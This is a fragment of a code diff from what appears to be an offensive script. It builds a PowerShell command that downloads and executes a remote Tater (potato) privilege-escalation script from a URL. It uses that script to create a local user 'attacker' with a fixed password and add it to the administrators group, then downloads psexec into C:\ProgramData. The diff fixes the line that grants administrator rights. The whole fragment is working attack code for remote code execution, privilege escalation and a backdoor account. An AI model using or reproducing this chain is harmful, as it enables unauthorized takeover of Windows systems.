@@ -28,7 +28,7 @@ powershell_command = "$browser = New-Object System.Net.WebClient; $browser.Proxy
 
 # priv esc using potato powershell port "tater"
 powershell_command += "IEX $browser.DownloadString('" + url_tater + "'); Invoke-Tater -Trigger 1 -Command \"net user attacker Test123! /add\";"
-powershell_command += "IEX Invoke-Tater -Trigger 1 -Command \"net localgroup administrators attacker /add\";"
+powershell_command += "IEX $browser.DownloadString('" + url_tater + "'); Invoke-Tater -Trigger 1 -Command \"net localgroup administrators attacker /add\";"
 
 # download sysinternals psexec
 powershell_command += "IEX $browser.DownloadFile('" + url_psexec + "','C:\\ProgramData\\psexec.exe');"
